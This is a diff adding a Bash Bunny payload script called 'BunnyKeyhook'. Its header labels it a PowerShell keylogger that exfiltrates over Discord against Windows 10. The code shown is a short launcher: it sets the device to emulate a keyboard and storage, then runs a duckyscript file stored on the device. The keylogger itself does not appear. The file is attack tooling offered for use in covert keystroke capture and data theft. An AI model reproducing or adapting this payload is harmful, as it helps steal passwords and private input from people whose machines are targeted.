@@ -1,0 +1,17 @@
+# Title: 		BunnyKeyhook
+# Description:	Powershell Keylogger w/ Discord
+# Author:		Blue Cosmo
+# Category:		exfiltration
+# Target:		Windows 10
+# Attackmodes:	HID, STORAGE
+
+# setup payload
+LED SETUP
+ATTACKMODE HID STORAGE
+GET SWITCH_POSITION
+
+# execute duckyscript
+LED STAGE1
+QUACK ${SWITCH_POSITION}/duckyscript.txt
+
+LED FINISH
